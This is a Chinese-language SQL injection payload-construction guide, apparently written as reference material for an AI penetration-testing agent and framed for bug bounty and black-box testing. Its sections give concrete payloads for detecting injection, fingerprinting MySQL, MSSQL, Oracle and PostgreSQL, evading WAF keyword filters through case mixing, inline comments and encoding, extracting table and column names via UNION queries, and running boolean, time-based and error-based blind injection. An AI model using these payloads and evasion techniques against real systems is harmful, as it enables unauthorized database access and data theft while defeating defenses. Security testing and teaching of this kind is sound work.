# SQLi Payload 构造思路

> **原则**: 给思路不给 Payload,让 AI 根据上下文动态构造
> **目标**: 提升 Payload 质量,降低 WAF 触发率,减少 Token 消耗

---

## 🔍 Grep 命令速查

```bash
# 快速索引 - 根据需求直接跳转
grep -A 20 "思路 1: 快速探测" references/payload-construction/sqli-construction.md
grep -A 20 "思路 2: 数据库指纹" references/payload-construction/sqli-construction.md
grep -A 30 "思路 3: WAF 绕过" references/payload-construction/sqli-construction.md
grep -A 25 "思路 4: 数据提取" references/payload-construction/sqli-construction.md
grep -A 20 "思路 5: 盲注优化" references/payload-construction/sqli-construction.md

# 查询自我检查清单
grep -A 10 "自我检查清单" references/payload-construction/sqli-construction.md
```

---

## 思路 1: 快速探测 (First-pass)

**目标**: 用最少请求判断是否存在注入

**构造逻辑**:

### 1.1 数字型参数
```
原始: id=1
测试: id=1 AND 1=1  (应该正常)
测试: id=1 AND 1=2  (应该异常)
```
**预期**: 前者正常,后者异常 → 存在注入

### 1.2 字符型参数
```
原始: name=admin
测试: name=admin' AND '1'='1  (应该正常)
测试: name=admin' AND '1'='2  (应该异常)
```
**预期**: 前者正常,后者异常 → 存在注入

### 1.3 时间盲注
```
测试: id=1 AND SLEEP(5)
```
**预期**: 响应延迟 5 秒 → 存在注入

**不要**:
- ❌ 直接用 `' OR 1=1--` (容易触发 WAF)
- ❌ 用 `' OR '1'='1` (太明显)
- ❌ 一上来就 UNION (可能列数不对)

**为什么**:
- 简单的 `AND 1=1` vs `AND 1=2` 对比最不容易触发 WAF
- 先确认存在注入,再深入利用

---

## 思路 2: 数据库指纹识别

**目标**: 确定数据库类型,针对性构造 Payload

**构造逻辑**:

### 2.1 通过延迟函数识别

| 数据库 | 延迟函数 | 测试 Payload |
|--------|---------|-------------|
| MySQL | `SLEEP(n)` | `id=1 AND SLEEP(5)` |
| MSSQL | `WAITFOR DELAY` | `id=1; WAITFOR DELAY '00:00:05'` |
| Oracle | `dbms_pipe.receive_message` | `id=1 AND dbms_pipe.receive_message('a',5)=1` |
| PostgreSQL | `pg_sleep(n)` | `id=1 AND pg_sleep(5)` |

### 2.2 通过版本函数识别

| 数据库 | 版本函数 | 测试 Payload |
|--------|---------|-------------|
| MySQL | `@@version` | `id=1 UNION SELECT @@version` |
| MSSQL | `@@version` | `id=1 UNION SELECT @@version` |
| Oracle | `banner FROM v$version` | `id=1 UNION SELECT banner FROM v$version` |
| PostgreSQL | `version()` | `id=1 UNION SELECT version()` |

**关键**: 不同数据库的函数不同,先识别再构造

---

## 思路 3: WAF 绕过

**目标**: 绕过关键字过滤

**构造逻辑**:

### 3.1 空格绕过

| 方法 | 示例 | 适用场景 |
|------|------|---------|
| 注释 | `/**/` | `SELECT/**/FROM` |
| Tab | `%09` | `SELECT%09FROM` |
| 换行 | `%0a` | `SELECT%0aFROM` |
| 括号 | `()` | `SELECT(column)FROM` |
| 加号 | `+` | `SELECT+FROM` (URL编码后) |

### 3.2 关键字绕过

| 方法 | 示例 | 原理 |
|------|------|------|
| 大小写 | `SeLeCt` | WAF 可能只匹配小写 |
| 双写 | `selselectect` | WAF 删除一次后仍有效 |
| 注释内联 | `/*!50000select*/` | MySQL 特定版本执行 |
| 编码 | `%53elect` | URL 编码绕过 |
| 等价函数 | `substr` → `mid` | 功能相同,名称不同 |

### 3.3 引号绕过

| 方法 | 示例 | 说明 |
|------|------|------|
| 十六进制 | `0x61646d696e` | 代替 `'admin'` |
| char() | `char(97,100,109,105,110)` | 代替 `'admin'` |
| concat() | `concat(0x61,0x64)` | 拼接字符 |

**关键**: 根据 WAF 拦截信息动态调整

**示例**:
```
第1次: SELECT * FROM users WHERE id=1
→ 被拦截 "SELECT 关键字"

第2次: SeLeCt * FROM users WHERE id=1
→ 被拦截 "FROM 关键字"

第3次: SeLeCt/**/*//**/FrOm users WHERE id=1
→ 成功绕过
```

---

## 思路 4: 数据提取

**目标**: 提取数据库内容

**构造逻辑**:

### 4.1 Union 注入步骤

**步骤 1**: 确定列数
```
id=1 ORDER BY 1  (正常)
id=1 ORDER BY 2  (正常)
id=1 ORDER BY 3  (正常)
id=1 ORDER BY 4  (报错) → 列数为 3
```

**步骤 2**: 确定回显位
```
id=-1 UNION SELECT 1,2,3
→ 页面显示 "2" → 第2列可回显
```

**步骤 3**: 提取数据
```
id=-1 UNION SELECT 1,database(),3  (当前数据库)
id=-1 UNION SELECT 1,user(),3      (当前用户)
id=-1 UNION SELECT 1,version(),3   (数据库版本)
```

### 4.2 提取表名和列名

**MySQL**:
```
# 提取表名
id=-1 UNION SELECT 1,group_concat(table_name),3 
FROM information_schema.tables 
WHERE table_schema=database()

# 提取列名
id=-1 UNION SELECT 1,group_concat(column_name),3 
FROM information_schema.columns 
WHERE table_name='users'
```

**关键**: 不要一上来就 dump 全库,先确认注入点稳定

---

## 思路 5: 盲注优化

**目标**: 当无回显时,提升盲注效率

**构造逻辑**:

### 5.1 布尔盲注 (二分法)

```
# 判断数据库名长度
id=1 AND LENGTH(database())>5   (True)
id=1 AND LENGTH(database())>10  (False)
→ 长度在 6-10 之间

# 二分法确定每个字符
id=1 AND ASCII(SUBSTR(database(),1,1))>109  (True)
id=1 AND ASCII(SUBSTR(database(),1,1))>115  (False)
→ 第1个字符 ASCII 在 110-115 之间
```

### 5.2 时间盲注 (优化)

```
# 不要每次都 SLEEP(5),太慢
# 用条件判断减少延迟次数

id=1 AND IF(LENGTH(database())>5, SLEEP(5), 0)
→ 如果长度>5,延迟5秒,否则立即返回
```

**关键**: 用二分法减少请求次数

---

## 思路 6: 报错注入

**目标**: 通过报错信息提取数据

**构造逻辑**:

### 6.1 MySQL 报错注入

```
# extractvalue
id=1 AND extractvalue(1, concat(0x7e, database(), 0x7e))

# updatexml
id=1 AND updatexml(1, concat(0x7e, database(), 0x7e), 1)

# exp
id=1 AND exp(~(SELECT * FROM (SELECT database())a))
```

### 6.2 MSSQL 报错注入

```
id=1 AND 1=CAST(@@version AS INT)
```

**关键**: 报错信息会显示在页面上

---

## 自我检查清单

在构造 SQLi Payload 前,问自己:

- [ ] 是否先用最简单的 Payload 探测? (`AND 1=1` vs `AND 1=2`)
- [ ] 是否识别了数据库类型? (MySQL/MSSQL/Oracle/PostgreSQL)
- [ ] 是否根据 WAF 拦截动态调整? (大小写/注释/编码)
- [ ] 是否避免了破坏性操作? (DROP/DELETE/UPDATE)
- [ ] 是否用二分法优化盲注? (减少请求次数)
- [ ] 是否先确定列数再 UNION? (ORDER BY 确定列数)

---

## 常见错误

### 错误 1: 直接用 `' OR 1=1--`

**问题**: 太明显,容易触发 WAF

**正确做法**: 先用 `AND 1=1` vs `AND 1=2` 对比

### 错误 2: 不识别数据库类型就构造 Payload

**问题**: MySQL 的 `SLEEP()` 在 MSSQL 上不工作

**正确做法**: 先用延迟函数识别数据库类型

### 错误 3: 盲注时每次都 SLEEP(5)

**问题**: 太慢,100 个字符需要 500 秒

**正确做法**: 用二分法 + 条件判断,减少延迟次数

### 错误 4: 一上来就 UNION SELECT 1,2,3,4,5

**问题**: 列数可能不对,导致报错

**正确做法**: 先用 ORDER BY 确定列数

---

## 参考资源

- MySQL 注入: 重点关注 `information_schema` 表
- MSSQL 注入: 重点关注 `sysobjects` 和 `syscolumns`
- Oracle 注入: 重点关注 `all_tables` 和 `all_tab_columns`
- PostgreSQL 注入: 重点关注 `pg_tables` 和 `pg_attribute`

---

**版本**: v1.0  
**更新日期**: 2026-04-25  
**适用场景**: Bug Bounty / SRC / 黑盒渗透测试